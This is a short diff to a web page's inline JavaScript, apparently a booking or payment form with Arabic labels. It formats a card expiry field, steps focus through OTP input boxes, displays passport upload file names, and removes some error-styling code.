+    document.getElementById('expiry').addEventListener('input', (e) => { let v = e.target.value.replace(/\D/g, ''); e.target.value = v.length > 2 ? v.substring(0, 2) + ' / ' + v.substring(2, 4) : v; });
     otpForm.querySelectorAll('input').forEach((input, index, inputs) => {
         input.addEventListener('input', () => { if (input.value && index < inputs.length - 1) inputs[index + 1].focus(); });
         input.addEventListener('keydown', (e) => { if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus(); });
     });
-
     document.addEventListener('change', (e) => {
         if (e.target.classList.contains('passport-file-input')) {
             const index = e.target.dataset.passengerIndex;
             const file = e.target.files[0];
             document.getElementById(`main_passport_file_name_${index}`).textContent = file?.name || 'لم يتم اختيار ملف';
-            const btn = e.target.nextElementSibling;
-            if(file && btn && btn.classList.contains('file-upload-btn')) {
-                btn.classList.remove('input-error');
-            }
         }
-        
         if (e.target.id === 'free_passportPicture') {
             const file = e.target.files[0];
             document.getElementById('free_passport_file_name').textContent = file?.name || 'لم يتم اختيار ملف';
-            const btn = e.target.nextElementSibling;
-            if(file && btn && btn.classList.contains('file-upload-btn')) {
-                btn.classList.remove('input-error');
-            }
         }
     });
-
 </script>
 
 </body>
 </html>
-
